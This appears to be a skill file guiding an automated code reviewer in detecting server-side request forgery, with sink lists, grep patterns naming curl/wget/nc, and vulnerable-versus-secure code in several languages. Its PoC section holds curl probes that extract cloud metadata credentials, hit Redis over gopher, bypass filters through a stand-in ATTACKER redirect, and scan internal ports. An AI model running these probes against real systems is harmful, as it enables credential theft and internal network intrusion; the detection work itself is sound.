---
name: ssrf
description: Server-Side Request Forgery detection (CWE-918)
---

# SSRF (CWE-918)

Identify cases where user-controlled URLs or hostnames are forwarded to server-side HTTP or network clients without adequate restriction.

The core pattern: *unvalidated, user-controlled input reaches the destination argument of an outbound network call.*

## What SSRF Is (and Is Not)

**What it IS**
- HTTP client calls where URL, host, IP, or port is built from user input: `requests.get(user_url)`, `fetch(req.body.webhook_url)`
- DNS lookups or raw TCP dials to user-supplied host/port: `dns.lookup(req.query.host)`, `net.Dial("tcp", host+":"+port)`
- Remote-scheme file fetchers: `file_get_contents($user_url)`, `URI.open(url)` (OpenURI)
- Webhooks, import-from-URL, image proxies, PDF/screenshot renderers — any feature that fetches a remote resource on behalf of the user
- Stored destinations: a URL saved from user input at write time and later used for an outbound request without allowlist validation

**What it is NOT**
- **Open redirect** — HTTP 302 to a user URL redirects the *browser*, not a server-side outbound request (see `open_redirect.md`)
- **XXE-based SSRF** — outbound requests triggered by XML external entities in a parser (see `xxe.md`)
- **XSS via URL** — rendering a user-supplied URL in HTML without escaping
- **IDOR** — changing an object ID to access another user's data
- **Client-side fetch** — the browser, not the server, performs the request
- **Hardcoded outbound calls** — fixed URLs with no user influence on the destination

## Source -> Sink Pattern

**Sources (remote flow sources)**: HTTP request parameters, headers, path segments, cookies, JSON/form body fields — anything modeled as remote user input that can carry a URL, hostname, IP, or URL fragment used to build an outbound request. Java excludes taint from `URLConnection.getInputStream()` responses (following a remote redirect is not worse than the remote server choosing the target).

**Sinks (`request-forgery` kind)**:
- `new URL(userInput).openConnection()`
- `HttpURLConnection` with user-controlled URL
- `RestTemplate.getForObject(userInput, ...)`
- `WebClient.create(userInput)`
- `OkHttpClient` with user-controlled URL
- `HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(userInput)))`
- `ImageIO.read(new URL(userInput))`
- `DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(userInput)`
- `URLClassLoader(new URL[]{new URL(userInput)})`
- Python: any `Http::Client::Request` URL part (`requests.get`, `urllib`, `httpx`, `aiohttp`, etc.)
- JavaScript: `ClientRequest` URL or host (`http.get`, `fetch`, `axios`, `new URL(userInput)`)
- Go: `Http::ClientRequest` URL, WebSocket URL, framework-modeled sinks (`request-forgery`, `request-forgery[host]`)
- Ruby: `Http::Client::Request` URL parts; C#: outbound HTTP client URL arguments

**Additional taint steps**: assigning to `URI`/`URL` host arguments; `Properties.setProperty("jdbcUrl", tainted)` propagates to the Properties object (JDBC URL SSRF).

**Sanitizers / barriers**:
- Java: hostname-sanitizing string prefix (`?`, `#`, or `/` not in scheme position); `List.contains(url)` guard; `URI.getHost().equals("fixed")`; regexp host check; `HostnameSanitizingPrefix` append; external `request-forgery` barrier models
- Python (full SSRF): string concat/format/f-string with fixed left side excluding bare `http://`/`https://`; `isalnum`/`isalpha`/digit/identifier checks; `re.match`/`re.fullmatch`; `AntiSSRF.URIValidator.in_domain()` and Azure domain validators (models-as-data)
- Python partial SSRF: above plus constant-comparison barriers; string-restriction guards
- JavaScript: `encodeURIComponent` (path separators); external barrier models; HTML sanitizer output (additional step)
- Go: hostname-sanitizing prefix edge; `isLocalUrl`/`isValidRedirect`-style redirect checks; regexp match guards; URL/hostname equality against constant; simple-type sanitizers
- Ruby: prefixed string interpolation (fixed prefix before user part)

## Recon: Outbound Sink Grep Patterns

Flag any call where a non-hardcoded URL, host, IP, or port is passed as the destination. Trace taint in a later pass; recon is structural only.

| Stack | Grep targets (destination argument may be variable) |
|-------|-----------------------------------------------------|
| Python | `requests\.(get\|post\|put\|request)`, `urllib\.request\.urlopen`, `httpx\.`, `aiohttp\.ClientSession`, `socket\.(connect\|create_connection)`, `dns\.resolver\.resolve`, `subprocess\.(run\|Popen).*\b(curl\|wget)\b` |
| Node.js | `\bfetch\(`, `axios\.(get\|post\|request)`, `http(s)?\.(get\|request)`, `got\(`, `net\.(connect\|createConnection)`, `dns\.(lookup\|resolve)`, `exec.*\b(curl\|wget)\b` |
| Ruby | `Net::HTTP\.`, `URI\.open`, `\bopen\(`, `RestClient\.`, `HTTParty\.`, `Faraday\.` |
| PHP | `curl_setopt.*CURLOPT_URL`, `curl_exec`, `file_get_contents\(`, `fopen\(.*http`, `Guzzle.*->(get\|request)`, `HttpClient.*->request` |
| Java | `\.openConnection\(\)`, `RestTemplate\.`, `WebClient\.`, `OkHttpClient`, `HttpClients\.`, `HttpGet\(`, `Jsoup\.connect` |
| Go | `http\.(Get\|Post\|NewRequest)`, `net\.Dial`, `net\.LookupHost`, `net\.ResolveTCPAddr` |
| C# | `HttpClient\.(Get\|Post\|Send)Async`, `WebRequest\.Create`, `WebClient\.Download` |

Skip fully hardcoded literals (`requests.get("https://api.example.com/data")`). Shell-outs to `curl`/`wget`/`nc` with a variable target are SSRF sinks.

## Vulnerable Conditions
- User-supplied input reaches any HTTP or network client URL parameter with no prior validation
- URL is parsed but only the hostname or scheme is checked against a denylist, which is bypassable via DNS rebinding, IPv6, or octal notation
- Destination was stored from user input earlier (webhook URL, avatar URL) with no allowlist at write or read time
- Only scheme restriction (`https://` only) or IP blocklist — bypassable to arbitrary HTTPS hosts, alternate IP notations, or redirect chains

## Safe Patterns

Effective mitigations (classify as **Not Vulnerable** when all apply):

**Strict host allowlist** — validate/sanitize before building the request URL; resolve hostname, then check against an explicit allowlist (not substring match):

```python
ALLOWED = {"api.example.com", "cdn.example.com"}
parsed = urlparse(user_url)
if parsed.hostname not in ALLOWED:
    raise ValueError("Destination not allowed")
requests.get(user_url)
```

**URL prefix allowlist** — restrict scheme and path prefix; still parse and verify host:

```python
ALLOWED_PREFIXES = ["https://api.example.com/", "https://cdn.example.com/"]
if not any(user_url.startswith(p) for p in ALLOWED_PREFIXES):
    abort(400)
```

**Resolve then validate IP** — resolve DNS first, reject private/link-local/metadata ranges on the resolved address, and pin that IP for the connection (blocks naive blocklist-only checks; TOCTOU remains if IP is not pinned):

```python
addrs = socket.getaddrinfo(parsed.hostname, parsed.port)
if any(ipaddress.ip_address(a[4][0]).is_private for a in addrs):
    raise ValueError("Internal destination blocked")
```

**Other safe shapes**
- User input used exclusively as a query parameter on a hardcoded host, never as authority
- URL assembled from a hardcoded base with user input confined to an encoded path segment
- Redirect following disabled on the HTTP client; handle redirects manually with re-validation
- Do not forward cookies, `Authorization`, or other auth headers to user-chosen destinations

> IP blocklists alone (`169.254.0.0/16`, `10.0.0.0/8`, …) are **not** sufficient — bypass via DNS rebinding, URL encoding, IPv6/decimal notation, or redirect chains. Treat blocklist-only code as Likely Vulnerable.

## Evasion Patterns
- `http://127.0.0.1` vs `http://0x7f000001` vs `http://[::1]` vs `http://localhost`
- DNS rebinding: domain resolves to an internal IP address after the initial check completes
- URL parser differentials: `http://evil.com@127.0.0.1`
- Redirect chains: an allowlisted URL responds with a redirect to an internal target

## Business Risk
- Unauthorized access to internal services such as metadata endpoints and admin panels
- Cloud metadata credential theft (AWS `169.254.169.254`, GCP, Azure IMDS)
- Internal network port enumeration
- Local file disclosure via `file://` protocol when the client supports it

## Java Source Detection Rules

### TRUE POSITIVE: User-controlled URL to server-side HTTP client
- External input controls the full URL or the target authority (`scheme://host:port`) that is passed to a server-side network client.
- Java sinks include `new URL(url).openConnection()`, `openStream()`, Apache HttpClient, `RestTemplate`, `WebClient`, `Jsoup.connect(...)`, and comparable outbound fetch APIs.
- Wrapper methods still qualify when the call chain traces from `@RequestParam` or other external input through a helper method to an outbound request.

### FALSE POSITIVE: Fixed or configuration-only outbound target
- A hardcoded URL, application property, service discovery endpoint, or other server-controlled configuration value used in `RestTemplate` or `URL.openConnection()` is not SSRF when request data cannot influence the destination.
- Do not flag a helper method or sink in isolation when no demonstrated path from external input to the requested URL exists.

### FALSE POSITIVE: Duplicate sink-only report
- A utility method such as `httpRequest(String requestUrl)` is not a standalone finding unless a specific externally controlled caller is identified.
- When the same external-input-to-sink path is already captured through the reachable controller endpoint, do not emit a second SSRF finding for the internal helper in isolation.
## Python/JS/PHP Source Detection Rules

### Python
- **VULN**: `requests.get(user_url)` — URL fully controlled by user
- **VULN**: `urllib.request.urlopen(user_input)`
- **VULN**: `requests.get(f"http://{user_host}/api")` — host portion is user-controlled
- **VULN**: `httpx.get(user_url)` / `httpx.AsyncClient().get(user_url)` — httpx follows same pattern as requests
- **VULN**: `aiohttp.ClientSession().get(user_url)` — async HTTP client with user-controlled URL
- **SAFE**: URL allowlist validation + only specific domains permitted

### JavaScript (Node.js)
- **VULN**: `axios.get(req.body.url)` — URL fully controlled by request body
- **VULN**: `fetch(req.query.url)`, `http.get(userUrl, ...)`
- **SAFE**: Fixed base URL with only the path portion user-controlled and validated

### PHP
- **VULN**: `file_get_contents($_GET['url'])` — PHP wrappers support `file://`, `http://`, `php://`
- **VULN**: `curl_setopt($ch, CURLOPT_URL, $_POST['url'])`
- **VULN**: `$data = file_get_contents("http://" . $_GET['host'] . "/api")`
- **PARTIAL HARDENING (not a complete SSRF fix)**: `curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS)` — restricts scheme only; does not block SSRF to attacker-chosen HTTPS hosts (external targets, internal HTTPS services, some metadata endpoints). Host/IP allowlisting (and blocking link-local/private ranges after DNS resolution) is still required.

## Vulnerable vs Secure Examples (Ruby, Go, C#)

### Ruby — Net::HTTP / OpenURI

```ruby
# VULNERABLE: open() fetches arbitrary URL
def import
  url = params[:url]
  content = URI.open(url).read
end

# SECURE: restrict scheme and host before open
def import
  url = params[:url]
  uri = URI.parse(url)
  raise "Forbidden" unless uri.is_a?(URI::HTTPS) && uri.host == "data.example.com"
  content = uri.open.read
end
```

### Go — net/http

```go
// VULNERABLE: user-supplied URL passed to http.Get
func proxyHandler(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("url")
    resp, _ := http.Get(target)
    io.Copy(w, resp.Body)
}

// SECURE: allowlist host after parse
func proxyHandler(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("url")
    u, err := url.Parse(target)
    if err != nil || u.Hostname() != "api.example.com" {
        http.Error(w, "Forbidden", 403)
        return
    }
    resp, _ := http.Get(target)
    io.Copy(w, resp.Body)
}
```

### C# — HttpClient

```csharp
// VULNERABLE: user-supplied URL passed to HttpClient
[HttpGet("proxy")]
public async Task<IActionResult> Proxy([FromQuery] string url)
{
    var response = await _httpClient.GetAsync(url);
    return Content(await response.Content.ReadAsStringAsync());
}

// SECURE: allowlist host before request
[HttpGet("proxy")]
public async Task<IActionResult> Proxy([FromQuery] string url)
{
    if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) ||
        uri.Host != "api.example.com")
        return Forbid();
    var response = await _httpClient.GetAsync(url);
    return Content(await response.Content.ReadAsStringAsync());
}
```

## Cloud Metadata Endpoint Exposure

```java
// VULNERABLE: fetching user-controlled URL that can reach cloud metadata
// AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
// GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
// Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
// These endpoints return cloud credentials when hit from the server

// VULN indicator: any URL fetch with user-controlled host/path that is NOT blocked
// by allowlist — cloud metadata IPs must be explicitly blocked
String url = request.getParameter("url");
restTemplate.getForObject(url, String.class);  // no IP allowlist check
```

### What to flag: Any HTTP client call with user-controlled URL where there is NO:
- IP blocklist that includes `169.254.169.254`, `metadata.google.internal`, `169.254.170.2`
- Scheme allowlist restricting to `https://` only on specific domains
- Host/IP validation against an allowlist

## SSRF via URL Parser Differentials

```java
// VULNERABLE: validation checks parsed URL but request uses raw input
// Parser differential: java.net.URL vs Apache HttpClient may parse differently
String url = request.getParameter("url");
URL parsed = new URL(url);
// Allowlist check on parsed.getHost() — but HTTP client may follow redirect
// to internal target after passing host check

// VULNERABLE: URL with credentials bypasses host-based allowlist
// http://allowed.com@169.254.169.254/ — some parsers use the part after @ as host
// http://169.254.169.254#allowed.com — fragment ignored by some validators
```

## SSRF via Redirect Chain

```java
// VULNERABLE: HTTP client follows redirects to internal targets
// Server at https://allowed.com/redirect?to=http://169.254.169.254/
// returns 302 Location: http://169.254.169.254/

// Java HttpURLConnection follows redirects by default
URL url = new URL(userInput);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setFollowRedirects(true);  // default — follows 301/302 to internal targets

// RestTemplate also follows redirects by default
restTemplate.getForObject(userInput, String.class);

// SAFE: disable redirect following and handle manually
conn.setInstanceFollowRedirects(false);
```

## SSRF to Internal Services (Gopher/File Protocol)

```java
// VULNERABLE: URL client that supports non-HTTP schemes
// Java URL.openConnection() supports: file://, jar://, ftp://
// If curl is used server-side (via exec), gopher:// may be available
URL url = new URL(userInput);
InputStream is = url.openStream();  // file:// reads local files — also SSRF→LFI
```

## Java Additional SSRF Sinks

```java
// VULNERABLE: XML parser as SSRF vector
DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
db.parse(new InputSource(userInput));   // userInput = "http://169.254.169.254/"

// VULNERABLE: ImageIO fetching remote URL
BufferedImage img = ImageIO.read(new URL(userInput));

// VULNERABLE: URL class loader loading from user URL
URLClassLoader loader = new URLClassLoader(new URL[]{new URL(userInput)});

// VULNERABLE: Jsoup connecting to user URL
Document doc = Jsoup.connect(userInput).get();

// VULNERABLE: Apache HttpComponents
CloseableHttpClient client = HttpClients.createDefault();
HttpGet get = new HttpGet(userInput);
client.execute(get);
```

## SSRF in Cloud/Kubernetes Environments — Additional Targets

When running on cloud/k8s, these internal URLs are high-value SSRF targets:
- `http://169.254.169.254/` — AWS/Azure/GCP instance metadata
- `http://100.100.100.200/` — Alibaba Cloud metadata
- `http://kubernetes.default.svc/` — K8s API server (internal)
- `http://10.0.0.1/` — typical internal gateway
- Redis on `redis://localhost:6379` — via gopher:// if supported

Flag any user-controlled URL fetch where these are not explicitly blocked.

## URL-Fetch / Media-Proxy SSRF (`url=` parameter pattern)

A very common SSRF shape is an endpoint that accepts a full URL (or host) in a request parameter and fetches it server-side as a "convenience" feature. This is a **class**, not a single product — detect it by the *fetch-by-user-URL* shape regardless of framework or language.

**Source parameter names to flag** (when the value is, or becomes, an absolute URL/host passed to an outbound client): `url`, `src`, `source`, `image`, `imageUrl`, `img`, `target`, `dest`, `uri`, `link`, `feed`, `callback`, `webhook`, `to`, `proxy`, `fetch`, `load`, `remote`.

**Feature archetypes — all the same class:**
- Image optimizers / resizers / thumbnailers (`/image?url=`, `/cdn-cgi/image/`, imgproxy, thumbor, Cloudinary `fetch`)
- Link preview / URL unfurling / oEmbed / favicon fetchers
- PDF / screenshot / HTML-to-image renderers (a headless browser fetches the URL)
- "Import from URL" / avatar-from-URL / remote file import
- Outbound webhooks / health-check pingers where the caller sets the URL

**Concrete instance — Next.js Image Optimization (`/_next/image?url=...`)**: the optimizer fetches `url` server-side; the host allowlist lives in `next.config.js`.
```js
// VULN — wildcard host allowlist lets the optimizer fetch ANY host (SSRF)
images: { remotePatterns: [{ protocol: 'https', hostname: '**' }] }   // or hostname: '*'
images: { domains: ['*'] }                                            // legacy field, same problem
// VULN — broad subdomain wildcard: pivot to internal via an open redirect on ANY matching subdomain
images: { remotePatterns: [{ hostname: '*.example.com' }] }
// SAFE — explicit, non-wildcard hosts only
images: { remotePatterns: [{ protocol: 'https', hostname: 'cdn.example.com' }] }
```
- **VULN**: `dangerouslyAllowSVG: true` (or any image proxy that serves the fetched SVG inline) — attacker points `url=` at a malicious SVG and gets stored/reflected XSS in the app origin. SVG is active content; see `xss.md`.

**What to flag**: any archetype above where the destination host is user-controlled and there is NO explicit non-wildcard host allowlist, NO scheme restriction to `http(s)`, and NO block of internal ranges / metadata IPs. The "resize / preview / import" feature is not a mitigation — it **is** the sink.

**FALSE POSITIVE**: destination restricted to an explicit non-wildcard host allowlist; user value confined to a path segment under a hardcoded base; `url=` only ever resolves to a fixed first-party asset host with validation.

## SSRF via Host / Forwarded Headers (request-context-derived URLs)

Servers sometimes build an *internal* request URL from request-context headers the client controls — `Host`, `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Server`, `Referer`, `Origin`. Because these are attacker-controllable, the "internal" fetch (or generated absolute link/callback) can be redirected to an arbitrary host. Framework-agnostic class; also drives password-reset link poisoning and cache poisoning.

**VULN shape**: `fetch(`${req.headers['x-forwarded-host']}/internal/path`)`; `new URL(path, `https://${req.headers.host}`)` then fetched; building absolute callback/reset URLs from `Host`.

**Concrete instance — Next.js Server Actions** (`"use server"` functions dispatched via the `Next-Action` header): older versions built the internal subrequest URL from the request `Host` header, so a spoofed `Host` turned action dispatch into blind→full-read SSRF (the `Next-Action` token selects the function; the request path is ignored). Generic lesson: any server-side request whose **authority** is derived from a request header is SSRF unless the host is validated against an allowlist.

**SAFE**: derive the base URL from server config/environment (e.g. `process.env.PUBLIC_URL`), not from request headers; validate `Host`/`X-Forwarded-Host` against an allowlist before use.

**Recognized sanitizers summary**: hostname-sanitizing prefixes, allowlist/`contains` guards, host equality checks, regexp barriers, fixed-prefix string construction (Python partial), `encodeURIComponent` (JS), redirect-check helpers (Go), `AntiSSRF` validators (Python), models-as-data `request-forgery` barriers.

## Dynamic Test / PoC

Confirm suspected SSRF at runtime when the endpoint is reachable:

**Cloud metadata (full-read signal)**
```bash
curl "https://app.example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
# Expect: IAM role name or instance metadata in response body
```

**Internal pivot / port probe**
```bash
curl "https://app.example.com/proxy?url=http://127.0.0.1:6379/"
# Expect: Redis banner, connection error with service fingerprint, or timing difference
```

**Blind SSRF (OAST)**
```bash
curl "https://app.example.com/webhook?url=http://YOUR-COLLABORATOR.oast.fun/ssrf-test"
# Expect: DNS/HTTP callback at collaborator; no response body needed
```

**Cloud metadata — GCP / Azure**
```bash
curl "https://app.example.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
curl "https://app.example.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# GCP: add header Metadata-Flavor: Google if the app forwards request headers
# Expect: instance metadata or service-account paths in response
```

**Filter bypass (when blocklist/allowlist checks hostname only)**
```bash
curl "https://app.example.com/fetch?url=http://2130706433/"              # decimal 127.0.0.1
curl "https://app.example.com/fetch?url=http://0x7f000001/"              # hex 127.0.0.1
curl "https://app.example.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"  # URL-encoded 127.0.0.1
curl "https://app.example.com/fetch?url=http://rebind.127.0.0.1.nip.io/" # DNS rebinding helper
curl "https://app.example.com/fetch?url=http://ATTACKER/redirect?to=http://169.254.169.254/"
# Expect: same internal/metadata content as direct 127.0.0.1 or 169.254.169.254 probes
```

**Non-HTTP schemes (when client supports them)**
```bash
curl "https://app.example.com/fetch?url=gopher://127.0.0.1:6379/_INFO"
# Expect: Redis INFO banner or protocol-specific response
```

**Internal port scan (timing/status oracle)**
```bash
for port in 80 443 8080 8443 3306 5432 6379 27017 9200; do
  curl -s -o /dev/null -w "%{http_code}:%{time_total}\n" \
    "https://app.example.com/fetch?url=http://127.0.0.1:$port/" &
done
wait
# Expect: distinct status codes or latency per open port
```

Use the parameter name observed in code (`url`, `target`, `webhook`, etc.). Restrict protocols/ports in remediation — PoC confirms reachability, not safe design.

## Common False Alarms

- Hardcoded or configuration-only outbound URLs with no path from remote input to the sink
- Internal helper/sink methods with no reachable controller passing user-controlled URL data
- Duplicate findings for the same external-input-to-sink path through a utility wrapper
- Python string built as `"https://" + userHost + ".example.com/data/"` flagged as partial SSRF when user only picks subdomain label — verify whether authority is truly attacker-controlled
- JavaScript client-side request forgery where the browser, not the server, performs the fetch — different risk class than SSRF
- Taint originating from response bodies of outbound HTTP requests (Java explicitly excludes `getInputStream()` results)

- FALSE POSITIVE guard: in `vulhub`, emit `ssrf` only when a selected representative directory is primarily an SSRF sample; do not infer SSRF from XXE, proxy, inclusion, or secondary fetch capability alone.
- FALSE POSITIVE guard: do not emit a project-level `ssrf` tag merely because an SSRF helper or vulnerable class exists. Require a mapped vulnerable route plus the same demonstrated path from user-controlled URL input to the outbound fetch.
